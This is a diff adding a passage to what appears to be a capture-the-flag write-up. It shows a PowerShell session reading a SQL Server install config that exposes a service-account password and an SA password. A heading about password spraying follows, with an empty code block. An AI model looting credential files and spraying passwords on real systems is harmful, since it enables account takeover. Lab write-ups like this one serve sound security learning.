@@ -319,5 +319,44 @@ There are quite a few users here, ill make a user list
 
 There is an internal web server on 8000 but thats being proxyed to port 8o so thats the host ive already abused
 
+```python
+PS C:\Users\sql_svc\Downloads\SQLEXPR-2019_x64_ENU> type sql-Configuration.INI
+type sql-Configuration.INI
+[OPTIONS]
+ACTION="Install"
+QUIET="True"
+FEATURES=SQL
+INSTANCENAME="SQLEXPRESS"
+INSTANCEID="SQLEXPRESS"
+RSSVCACCOUNT="NT Service\ReportServer$SQLEXPRESS"
+AGTSVCACCOUNT="NT AUTHORITY\NETWORK SERVICE"
+AGTSVCSTARTUPTYPE="Manual"
+COMMFABRICPORT="0"
+COMMFABRICNETWORKLEVEL=""0"
+COMMFABRICENCRYPTION="0"
+MATRIXCMBRICKCOMMPORT="0"
+SQLSVCSTARTUPTYPE="Automatic"
+FILESTREAMLEVEL="0"
+ENABLERANU="False" 
+SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS"
+SQLSVCACCOUNT="FREELANCER\sql_svc"
+SQLSVCPASSWORD="IL0v3ErenY3ager"
+SQLSYSADMINACCOUNTS="FREELANCER\Administrator"
+SECURITYMODE="SQL"
+SAPWD="t3mp0r@ryS@PWD"
+ADDCURRENTUSERASSQLADMIN="False"
+TCPENABLED="1"
+NPENABLED="1"
+BROWSERSVCSTARTUPTYPE="Automatic"
+IAcceptSQLServerLicenseTerms=True
+PS C:\Users\sql_svc\Downloads\SQLEXPR-2019_x64_ENU> 
+```
 
+Found two passwords
+
+# Password spray leads to user compromise
+
+```python
+
+```
 
